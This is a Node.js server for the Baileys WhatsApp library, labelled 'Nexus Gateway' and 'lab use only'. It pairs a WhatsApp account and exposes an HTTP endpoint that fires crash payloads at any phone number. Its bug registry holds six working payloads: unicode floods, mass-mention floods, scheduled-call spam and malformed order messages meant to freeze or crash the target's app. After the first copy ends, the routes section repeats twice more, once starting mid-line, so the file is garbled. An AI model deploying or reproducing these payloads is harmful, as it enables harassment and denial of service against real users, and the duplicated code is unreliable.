// ============================================================
// Nexus Gateway — Baileys (Railway)
// For security research / lab use only.
// ============================================================
const express = require("express");
const path = require("path");
const fs = require("fs");
const pino = require("pino");
const cors = require("cors");
const {
  default: makeWASocket,
  useMultiFileAuthState,
  DisconnectReason,
  generateWAMessageFromContent,
  proto,
  fetchLatestBaileysVersion,
  makeCacheableSignalKeyStore,
  Browsers
} = require("@whiskeysockets/baileys");

const app = express();

const ALLOWED = (process.env.ALLOWED_ORIGINS || "*")
  .split(",").map(s => s.trim()).filter(Boolean);

app.use(cors({
  origin: (origin, cb) => {
    if (!origin) return cb(null, true);
    if (ALLOWED.includes("*") || ALLOWED.includes(origin)) return cb(null, true);
    return cb(null, false);
  }
}));

app.use(express.json());

const SESSIONS_DIR = path.join(__dirname, "..", "sessions");
if (!fs.existsSync(SESSIONS_DIR)) fs.mkdirSync(SESSIONS_DIR, { recursive: true });

const logger = pino({ level: "silent" });
const clients = new Map();

const getClient = (sender) => clients.get(sender) || null;
const cleanNum = (v) => String(v || "").replace(/\D/g, "");

// ============================================================
// START WA CLIENT
// ============================================================
async function startClient(sender) {
  const existing = clients.get(sender);
  if (existing && (existing.status === "pairing" || existing.status === "connected")) {
    return existing;
  }

  const authDir = path.join(SESSIONS_DIR, sender);
  if (!fs.existsSync(authDir)) fs.mkdirSync(authDir, { recursive: true });

  const { state, saveCreds } = await useMultiFileAuthState(authDir);
  const { version, isLatest } = await fetchLatestBaileysVersion();

  console.log(`[boot] baileys version: ${version.join(".")} | isLatest: ${isLatest}`);
  console.log(`[boot] sender: ${sender} | registered: ${!!state.creds.registered}`);

  const sock = makeWASocket({
    version,
    logger,
    printQRInTerminal: false,
    browser: Browsers.ubuntu("Chrome"),
    auth: {
      creds: state.creds,
      keys: makeCacheableSignalKeyStore(state.keys, logger)
    },
    connectTimeoutMs: 60000,
    defaultQueryTimeoutMs: 60000,
    keepAliveIntervalMs: 30000,
    retryRequestDelayMs: 500,
    maxMsgRetryCount: 5,
    syncFullHistory: false,
    shouldSyncHistoryMessage: () => false,
    markOnlineOnConnect: false,
    generateHighQualityLinkPreview: false,
    emitOwnEvents: false,
    fireInitQueries: true
  });

  const entry = {
    sender, status: "pairing", code: null, sock,
    connectedAt: null, startedAt: Date.now(), reconnectAttempts: 0
  };
  clients.set(sender, entry);

  sock.ev.on("creds.update", saveCreds);

  sock.ev.on("connection.update", async (update) => {
    const { connection, lastDisconnect, isNewLogin, receivedPendingNotifications } = update;
    const c = clients.get(sender);
    if (!c) return;

    console.log(`[conn] ${sender} -> connection=${connection} newLogin=${isNewLogin} pending=${receivedPendingNotifications} err=${lastDisconnect?.error?.message || "-"}`);

    if (connection === "open") {
      c.status = "connected";
      c.connectedAt = Date.now();
      c.code = null;
      c.reconnectAttempts = 0;
      console.log(`[+] ${sender} CONNECTED`);
    }

    if (connection === "close") {
      const code = lastDisconnect?.error?.output?.statusCode;
      const loggedOut = code === DisconnectReason.loggedOut;
      const replace = code === DisconnectReason.connectionReplaced;
      console.log(`[-] ${sender} closed code=${code}`);

      c.status = "idle";
      c.connectedAt = null;

      if (loggedOut || replace) {
        try { fs.rmSync(authDir, { recursive: true, force: true }); } catch {}
        clients.delete(sender);
        return;
      }

      if (c.reconnectAttempts < 5) {
        c.reconnectAttempts++;
        console.log(`[retry] ${sender} attempt ${c.reconnectAttempts}`);
        setTimeout(() => {
          clients.delete(sender);
          startClient(sender).catch(e => console.error("[retry fail]", e.message));
        }, 3000);
      }
    }
  });

  if (!state.creds.registered) {
    await new Promise(r => setTimeout(r, 3000));
    try {
      console.log(`[*] requesting pairing code for ${sender}...`);
      const code = await sock.requestPairingCode(sender);
      entry.code = code;
      entry.status = "pairing";
      console.log(`[*] ${sender} PAIRING CODE: ${code}`);
    } catch (err) {
      console.error("[!] requestPairingCode FAILED:", err);
      console.error("[!] stack:", err?.stack);
      entry.status = "error";
      entry.error = err.message || String(err);
    }
  } else {
    console.log(`[boot] ${sender} already registered`);
  }

  return entry;
}

// ============================================================
// BUG REGISTRY
// ============================================================
const BUG_REGISTRY = {
  "crash-infinity": {
    name: "Crash Infinity",
    desc: "Interactive message unicode flood",
    async run({ sock, target, log }) {
      const jid = target + "@s.whatsapp.net";
      const padding = "ꦾ".repeat(50000);
      const msg = generateWAMessageFromContent(jid, proto.Message.fromObject({
        viewOnceMessage: { message: { interactiveMessage: {
          body: { text: "NEXUS // payload " + padding },
          footer: { text: "nexus" },
          nativeFlowMessage: {
            buttons: [{
              name: "quick_reply",
              buttonParamsJson: JSON.stringify({ display_text: padding, id: "nexus" })
            }]
          }
        }}}
      }), { userJid: jid });
      await sock.relayMessage(jid, msg.message, { messageId: msg.key.id });
      log(`sent to ${jid}`, "ok");
    }
  },
  "blank-freeze": {
    name: "Blank Freeze",
    desc: "Blank reply payload",
    async run({ sock, target, log }) {
      const jid = target + "@s.whatsapp.net";
      for (let i = 0; i < 5; i++) {
        const msg = generateWAMessageFromContent(jid, proto.Message.fromObject({
          viewOnceMessage: { message: { listResponseMessage: {
            title: "NEXUS",
            description: "\n\n\n" + "𑪆".repeat(260000),
            singleSelectReply: { selectedId: "nexus" },
            listType: 1
          }}}
        }), { userJid: jid });
        await sock.relayMessage(jid, msg.message, { messageId: msg.key.id });
        log(`freeze packet ${i + 1}/5`, "info");
        await new Promise(r => setTimeout(r, 400));
      }
      log("blank-freeze complete", "ok");
    }
  },
  "lag-flood": {
    name: "Lag Flood",
    desc: "Massive mention flood",
    async run({ sock, target, log }) {
      const jid = target + "@s.whatsapp.net";
      const mentions = ["0@s.whatsapp.net", ...Array.from({ length: 30000 }, () =>
        `1${Math.floor(Math.random() * 5000000)}@s.whatsapp.net`)];
      const msg = generateWAMessageFromContent(jid, proto.Message.fromObject({
        ephemeralMessage: { message: { interactiveMessage: {
          header: { title: "NEXUS", hasMediaAttachment: false },
          body: { text: "NEXUS flood" },
          nativeFlowMessage: { messageParamsJson: "{".repeat(10000) },
          contextInfo: { participant: jid, mentionedJid: mentions }
        }}}
      }), { userJid: jid });
      await sock.relayMessage(jid, msg.message, { messageId: msg.key.id });
      log("lag-flood dispatched", "ok");
    }
  },
  "ui-crash": {
    name: "UI Crash",
    desc: "Scheduled call creation flood",
    async run({ sock, target, log }) {
      const jid = target + "@s.whatsapp.net";
      for (let i = 0; i < 5; i++) {
        const msg = generateWAMessageFromContent(jid, proto.Message.fromObject({
          scheduledCallCreationMessage: {
            callType: "AUDIO",
            scheduledTimestampMs: Date.now() + 3600000,
            title: "NEXUS // " + "ꦾ".repeat(50000)
          }
        }), { userJid: jid });
        await sock.relayMessage(jid, msg.message, { messageId: msg.key.id });
        log(`ui-crash ${i + 1}/5`, "info");
        await new Promise(r => setTimeout(r, 400));
      }
      log("ui-crash complete", "ok");
    }
  },
  "xios": {
    name: "X-IOS",
    desc: "iOS targeted payload",
    async run({ sock, target, log }) {
      const jid = target + "@s.whatsapp.net";
      const body = "\u2000".repeat(100000);
      for (let i = 0; i < 3; i++) {
        await sock.sendMessage(jid, { text: "NEXUS // xios " + body });
        log(`xios ${i + 1}/3`, "info");
        await new Promise(r => setTimeout(r, 500));
      }
      log("xios complete", "ok");
    }
  },
  "xandroid": {
    name: "X-Android",
    desc: "Android targeted payload",
    async run({ sock, target, log }) {
      const jid = target + "@s.whatsapp.net";
      for (let i = 0; i < 3; i++) {
        const msg = generateWAMessageFromContent(jid, proto.Message.fromObject({
          viewOnceMessage: { message: { orderMessage: {
            orderId: "999999999",
            itemCount: 1999,
            status: "INQUIRY",
            surface: "CATALOG",
            message: "NEXUS",
            orderTitle: "x".repeat(10000),
            sellerJid: "0@s.whatsapp.net",
            token: "AR6z9PAvHjs9Qa7AYgBUjSEvcnOcRWycFpwieIhaMKdrhQ=="
          }}}
        }), { userJid: jid });
        await sock.relayMessage(jid, msg.message, { messageId: msg.key.id });
        log(`xandroid ${i + 1}/3`, "info");
        await new Promise(r => setTimeout(r, 500));
      }
      log("xandroid complete", "ok");
    }
  }
};

// ============================================================
// ROUTES
// ============================================================
app.get("/api/health", (req, res) => {
  res.json({ ok: true, clients: clients.size, uptime: process.uptime() });
});

app.get("/api/debug/state", (req, res) => {
  const sender = cleanNum(req.query.sender);
  const c = sender ? clients.get(sender) : null;
  res.json({
    ok: true,
    total: clients.size,
    sender: sender || null,
    entry: c ? { status: c.status, code: c.code, error: c.error || null, connectedAt: c.connectedAt } : null
  });
});

app.get("/api/bugs", (req, res) => {
  const list = Object.entries(BUG_REGISTRY).map(([id, b]) => ({ id, name: b.name, desc: b.desc }));
  res.json({ success: true, bugs: list });
});

app.post("/api/sender/request", async (req, res) => {
  const sender = cleanNum(req.body?.sender);
  console.log(`[req] sender/request received: ${sender}`);

  if (!sender || sender.length < 8 || sender.length > 15) {
    return res.status(400).json({ success: false, message: "Nomor sender tidak valid." });
  }
  try {
    const entry = await startClient(sender);
    let waited = 0;
    while (!entry.code && entry.status === "pairing" && waited < 20000) {
      await new Promise(r => setTimeout(r, 300));
      waited += 300;
    }
    if (entry.status === "connected") {
      console.log(`[req] sender/request -> connected`);
      return res.json({ success: true, status: "connected" });
    }
    if (entry.code) {
      console.log(`[req] sender/request -> code=${entry.code}`);
      return res.json({ success: true, status: "pairing", code: entry.code });
    }
    console.log(`[req] sender/request -> FAILED: ${entry.error}`);
    return res.status(500).json({
      success: false,
      message: entry.error || "Pairing code tidak muncul.",
      debug: { status: entry.status, waited }
    });
  } catch (err) {
    console.error(`[req] sender/request EXCEPTION:`, err);
    return res.status(500).json({
      success: false,
      message: err.message || String(err),
      stack: (err.stack || "").split("\n").slice(0, 3).join("\n")
    });
  }
});

app.get("/api/sender/status", (req, res) => {
  const sender = cleanNum(req.query.sender);
  if (!sender) return res.status(400).json({ success: false, message: "sender required" });
  const c = getClient(sender);
  if (!c) return res.json({ success: true, status: "idle" });
  res.json({ success: true, status: c.status, connectedAt: c.connectedAt, code: c.code });
});

app.post("/api/sender/reset", async (req, res) => {
  const sender = cleanNum(req.body?.sender);
  if (!sender) return res.status(400).json({ success: false, message: "sender required" });
  const c = clients.get(sender);
  if (c?.sock) {
    try { await c.sock.logout(); } catch {}
    try { c.sock.end?.(); } catch {}
  }
  clients.delete(sender);
  try { fs.rmSync(path.join(SESSIONS_DIR, sender), { recursive: true, force: true }); } catch {}
  res.json({ success: true });
});

app.get("/api/bug/execute", async (req, res) => {
  const sender = cleanNum(req.query.sender);
  const target = cleanNum(req.query.target);
  const bugId = String(req.query.bug || "");

  res.setHeader("Content-Type", "text/event-stream");
  res.setHeader("Cache-Control", "no-cache");
  res.setHeader("Connection", "keep-alive");
  res.setHeader("X-Accel-Buffering", "no");
  res.flushHeaders?.();

  const send = (event, data) => {
    res.write(`event: ${event}\n`);
    res.write(`data: ${JSON.stringify(data)}\n\n`);
  };

  if (!sender) { send("error", { message: "sender belum diatur" }); return res.end(); }
  if (!target) { send("error", { message: "target kosong" }); return res.end(); }

  const c = getClient(sender);
  if (!c || c.status !== "connected") {
    send("error", { message: "sender belum terhubung ke WhatsApp" });
    return res.end();
  }
  const bug = BUG_REGISTRY[bugId];
  if (!bug) { send("error", { message: "bug tidak dikenal" }); return res.end(); }

  const log = (msg, level = "info") => send("log", { ts: Date.now(), msg, level });
  send("start", { bug: bug.name, target, sender });
  log(`sender  : ${sender}`);
  log(`target  : ${target}`);
  log(`payload : ${bug.name}`);

  try {
    await bug.run({ sock: c.sock, target, log });
    log("done", "ok");
    send("done", { ok: true });
  } catch (err) {
    log(`error: ${err.message}`, "error");
    send("error", { message: err.message });
  } finally {
    res.end();
  }
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => console.log(`[NEXUS-GATEWAY] listening on :${PORT}`));

process.on("uncaughtException", (e) => console.error("[uncaught]", e));
process.on("unhandledRejection", (e) => console.error("[unhandled]", e));=====
// ROUTES
// ============================================================
app.get("/api/health", (req, res) => {
  res.json({ ok: true, clients: clients.size, uptime: process.uptime() });
});

app.get("/api/debug/state", (req, res) => {
  const sender = cleanNum(req.query.sender);
  const c = sender ? clients.get(sender) : null;
  res.json({
    ok: true,
    total: clients.size,
    sender: sender || null,
    entry: c ? { status: c.status, code: c.code, connectedAt: c.connectedAt, startedAt: c.startedAt } : null
  });
});

app.get("/api/bugs", (req, res) => {
  const list = Object.entries(BUG_REGISTRY).map(([id, b]) => ({ id, name: b.name, desc: b.desc }));
  res.json({ success: true, bugs: list });
});

app.post("/api/sender/request", async (req, res) => {
  const sender = cleanNum(req.body?.sender);
  if (!sender || sender.length < 8 || sender.length > 15) {
    return res.status(400).json({ success: false, message: "Nomor sender tidak valid." });
  }
  try {
    const entry = await startClient(sender);
    let waited = 0;
    while (!entry.code && entry.status === "pairing" && waited < 20000) {
      await new Promise(r => setTimeout(r, 300));
      waited += 300;
    }
    if (entry.status === "connected") return res.json({ success: true, status: "connected" });
    if (entry.code) return res.json({ success: true, status: "pairing", code: entry.code });
    return res.status(500).json({ success: false, message: entry.error || "Pairing code tidak muncul." });
  } catch (err) {
    return res.status(500).json({ success: false, message: err.message });
  }
});

app.get("/api/sender/status", (req, res) => {
  const sender = cleanNum(req.query.sender);
  if (!sender) return res.status(400).json({ success: false, message: "sender required" });
  const c = getClient(sender);
  if (!c) return res.json({ success: true, status: "idle" });
  res.json({ success: true, status: c.status, connectedAt: c.connectedAt, code: c.code });
});

app.post("/api/sender/reset", async (req, res) => {
  const sender = cleanNum(req.body?.sender);
  if (!sender) return res.status(400).json({ success: false, message: "sender required" });
  const c = clients.get(sender);
  if (c?.sock) {
    try { await c.sock.logout(); } catch {}
    try { c.sock.end?.(); } catch {}
  }
  clients.delete(sender);
  try { fs.rmSync(path.join(SESSIONS_DIR, sender), { recursive: true, force: true }); } catch {}
  res.json({ success: true });
});

app.get("/api/bug/execute", async (req, res) => {
  const sender = cleanNum(req.query.sender);
  const target = cleanNum(req.query.target);
  const bugId = String(req.query.bug || "");

  res.setHeader("Content-Type", "text/event-stream");
  res.setHeader("Cache-Control", "no-cache");
  res.setHeader("Connection", "keep-alive");
  res.setHeader("X-Accel-Buffering", "no");
  res.flushHeaders?.();

  const send = (event, data) => {
    res.write(`event: ${event}\n`);
    res.write(`data: ${JSON.stringify(data)}\n\n`);
  };

  if (!sender) { send("error", { message: "sender belum diatur" }); return res.end(); }
  if (!target) { send("error", { message: "target kosong" }); return res.end(); }

  const c = getClient(sender);
  if (!c || c.status !== "connected") {
    send("error", { message: "sender belum terhubung ke WhatsApp" });
    return res.end();
  }
  const bug = BUG_REGISTRY[bugId];
  if (!bug) { send("error", { message: "bug tidak dikenal" }); return res.end(); }

  const log = (msg, level = "info") => send("log", { ts: Date.now(), msg, level });
  send("start", { bug: bug.name, target, sender });
  log(`sender  : ${sender}`);
  log(`target  : ${target}`);
  log(`payload : ${bug.name}`);

  try {
    await bug.run({ sock: c.sock, target, log });
    log("done", "ok");
    send("done", { ok: true });
  } catch (err) {
    log(`error: ${err.message}`, "error");
    send("error", { message: err.message });
  } finally {
    res.end();
  }
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => console.log(`[NEXUS-GATEWAY] listening on :${PORT}`));

process.on("uncaughtException", (e) => console.error("[uncaught]", e));
process.on("unhandledRejection", (e) => console.error("[unhandled]", e));true, status: "idle" });
  res.json({ success: true, status: c.status, connectedAt: c.connectedAt, code: c.code });
});

app.post("/api/sender/reset", async (req, res) => {
  const sender = cleanNum(req.body?.sender);
  if (!sender) return res.status(400).json({ success: false, message: "sender required" });
  const c = clients.get(sender);
  if (c?.sock) {
    try { await c.sock.logout(); } catch {}
    try { c.sock.end?.(); } catch {}
  }
  clients.delete(sender);
  try { fs.rmSync(path.join(SESSIONS_DIR, sender), { recursive: true, force: true }); } catch {}
  res.json({ success: true });
});

app.get("/api/bug/execute", async (req, res) => {
  const sender = cleanNum(req.query.sender);
  const target = cleanNum(req.query.target);
  const bugId = String(req.query.bug || "");

  res.setHeader("Content-Type", "text/event-stream");
  res.setHeader("Cache-Control", "no-cache");
  res.setHeader("Connection", "keep-alive");
  res.setHeader("X-Accel-Buffering", "no");
  res.flushHeaders?.();

  const send = (event, data) => {
    res.write(`event: ${event}\n`);
    res.write(`data: ${JSON.stringify(data)}\n\n`);
  };

  if (!sender) { send("error", { message: "sender belum diatur" }); return res.end(); }
  if (!target) { send("error", { message: "target kosong" }); return res.end(); }

  const c = getClient(sender);
  if (!c || c.status !== "connected") {
    send("error", { message: "sender belum terhubung ke WhatsApp" });
    return res.end();
  }
  const bug = BUG_REGISTRY[bugId];
  if (!bug) { send("error", { message: "bug tidak dikenal" }); return res.end(); }

  const log = (msg, level = "info") => send("log", { ts: Date.now(), msg, level });
  send("start", { bug: bug.name, target, sender });
  log(`sender  : ${sender}`);
  log(`target  : ${target}`);
  log(`payload : ${bug.name}`);

  try {
    await bug.run({ sock: c.sock, target, log });
    log("done", "ok");
    send("done", { ok: true });
  } catch (err) {
    log(`error: ${err.message}`, "error");
    send("error", { message: err.message });
  } finally {
    res.end();
  }
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => console.log(`[NEXUS-GATEWAY] listening on :${PORT}`));

process.on("uncaughtException", (e) => console.error("[uncaught]", e));
process.on("unhandledRejection", (e) => console.error("[unhandled]", e));
